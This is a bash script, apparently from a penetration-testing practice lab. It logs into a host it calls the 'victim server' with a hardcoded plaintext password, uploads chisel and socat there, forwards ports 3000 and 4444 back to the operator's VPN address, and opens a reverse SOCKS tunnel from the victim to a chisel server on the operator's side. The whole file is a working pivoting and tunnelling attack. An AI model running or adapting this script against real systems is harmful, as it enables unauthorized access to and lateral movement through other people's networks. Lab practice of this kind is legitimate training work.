#!/bin/bash
myip=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
echo "Uploading chisel and socat"
sshpass -p 'monkey' scp /home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel sean@10.11.1.251:/home/sean/chisel
sshpass -p 'monkey' scp /home/p4cm4n/Pentest_Learning/linux_remote_tools/socat sean@10.11.1.251:/home/sean/socat
echo "Forwarding ports 4444 and 3000 with socat"
sshpass -p 'monkey' ssh sean@10.11.1.251 "/home/sean/socat tcp-l:3000,fork,reuseaddr tcp:$myip:3000" &
sshpass -p 'monkey' ssh sean@10.11.1.251 "/home/sean/socat tcp-l:4444,fork,reuseaddr tcp:$myip:4444" &
echo "Starting chisel server"
/home/p4cm4n/Pentest_Learning/linux_remote_tools/chisel server --port 6969 --reverse &
echo "Starging chisel client on victim server"
sshpass -p 'monkey' ssh sean@10.11.1.251 "chmod +x /home/sean/chisel;/home/sean/chisel client $myip:6969 R:socks" &

